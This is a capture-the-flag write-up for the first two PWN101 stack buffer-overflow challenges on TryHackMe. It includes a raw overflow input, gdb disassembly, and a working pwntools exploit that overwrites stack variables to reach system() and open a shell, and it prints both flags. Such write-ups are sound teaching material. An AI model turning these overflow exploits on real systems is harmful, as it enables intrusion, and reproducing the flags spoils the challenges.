# PWN101

Beginner level binary exploitation challenges.



## Challenge 1 - pwn101

Just overflow the program.............

```bash
❯ nc 10.10.112.167 9001
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks, Here's a small gift for you <3

ls
flag.txt
pwn101
pwn101.c
cat flag.txt
THM{7h4t's_4n_3zy_oveRflowwwww}


```

---

---

## Challenge 2 - pwn102

let's open the binary in cutter:

---

<img width="1388" alt="Screenshot 2024-04-12 at 1 50 07 AM" src="https://github.com/Lynk4/THM/assets/44930131/842b2094-805f-47e2-9ba0-cd2702ba2953">

---

In gdb:


```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000000006e0  _init
0x0000000000000710  puts@plt
0x0000000000000720  system@plt
0x0000000000000730  printf@plt
0x0000000000000740  setvbuf@plt
0x0000000000000750  __isoc99_scanf@plt
0x0000000000000760  exit@plt
0x0000000000000770  __cxa_finalize@plt
0x0000000000000780  _start
0x00000000000007b0  deregister_tm_clones
0x00000000000007f0  register_tm_clones
0x0000000000000840  __do_global_dtors_aux
0x0000000000000880  frame_dummy
0x000000000000088a  setup
0x00000000000008eb  banner
0x00000000000008fe  main
0x00000000000009b0  __libc_csu_init
0x0000000000000a20  __libc_csu_fini
0x0000000000000a24  _fini
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000000008fe <+0>:	push   rbp
   0x00000000000008ff <+1>:	mov    rbp,rsp
   0x0000000000000902 <+4>:	sub    rsp,0x70
   0x0000000000000906 <+8>:	mov    eax,0x0
   0x000000000000090b <+13>:	call   0x88a <setup>
   0x0000000000000910 <+18>:	mov    eax,0x0
   0x0000000000000915 <+23>:	call   0x8eb <banner>
   0x000000000000091a <+28>:	mov    DWORD PTR [rbp-0x4],0xbadf00d
   0x0000000000000921 <+35>:	mov    DWORD PTR [rbp-0x8],0xfee1dead
   0x0000000000000928 <+42>:	mov    edx,DWORD PTR [rbp-0x8]
   0x000000000000092b <+45>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000000092e <+48>:	mov    esi,eax
   0x0000000000000930 <+50>:	lea    rdi,[rip+0x212]        # 0xb49
   0x0000000000000937 <+57>:	mov    eax,0x0
   0x000000000000093c <+62>:	call   0x730 <printf@plt>
   0x0000000000000941 <+67>:	lea    rax,[rbp-0x70]
   0x0000000000000945 <+71>:	mov    rsi,rax
   0x0000000000000948 <+74>:	lea    rdi,[rip+0x217]        # 0xb66
   0x000000000000094f <+81>:	mov    eax,0x0
   0x0000000000000954 <+86>:	call   0x750 <__isoc99_scanf@plt>
   0x0000000000000959 <+91>:	cmp    DWORD PTR [rbp-0x4],0xc0ff33
   0x0000000000000960 <+98>:	jne    0x992 <main+148>
   0x0000000000000962 <+100>:	cmp    DWORD PTR [rbp-0x8],0xc0d3
   0x0000000000000969 <+107>:	jne    0x992 <main+148>
   0x000000000000096b <+109>:	mov    edx,DWORD PTR [rbp-0x8]
   0x000000000000096e <+112>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000971 <+115>:	mov    esi,eax
   0x0000000000000973 <+117>:	lea    rdi,[rip+0x1ef]        # 0xb69
   0x000000000000097a <+124>:	mov    eax,0x0
   0x000000000000097f <+129>:	call   0x730 <printf@plt>
   0x0000000000000984 <+134>:	lea    rdi,[rip+0x1f4]        # 0xb7f
   0x000000000000098b <+141>:	call   0x720 <system@plt>
   0x0000000000000990 <+146>:	jmp    0x9a8 <main+170>
   0x0000000000000992 <+148>:	lea    rdi,[rip+0x1ef]        # 0xb88
   0x0000000000000999 <+155>:	call   0x710 <puts@plt>
   0x000000000000099e <+160>:	mov    edi,0x539
   0x00000000000009a3 <+165>:	call   0x760 <exit@plt>
   0x00000000000009a8 <+170>:	leave
   0x00000000000009a9 <+171>:	ret
End of assembler dump.
pwndbg>
```
so the binary checks arguments 0xc0ff33 , 0xc0d3 to pop a shell.

let's find a offset

We are writing at rsp 0x70 upto rbp 0x8

offset will be 104 in decimal and 0x68 in hex:

---

<img width="1429" alt="Screenshot 2024-04-12 at 1 45 11 AM" src="https://github.com/Lynk4/THM/assets/44930131/de210749-88fb-4871-8a99-56ac1acda792">

---

Now let's create the exploit

```python3
#!/usr/bin/python3


from pwn import *

context.binary = binary = "./pwn102-1644307392479.pwn102"

#0xc0ff33 0xc0d3

payload = b"A"*0x68 + p32(0xc0d3) + p32(0xc0ff33)

# process
p = remote("10.10.112.167", 9002)
p.recv()
p.sendline(payload)
p.interactive()
```
let's test it....

```bash
❯ python3 exploit.py
[*] '/home/lynk/thm/pwn101/pwn102/pwn102-1644307392479.pwn102'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 10.10.112.167 on port 9002: Done
[*] Switching to interactive mode

I need badf00d to fee1dead
Am I right? Yes, I need c0ff33 to c0d3
$ ls
flag.txt
pwn102
pwn102.c
$ cat flag.txt
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
$  
```


---

---














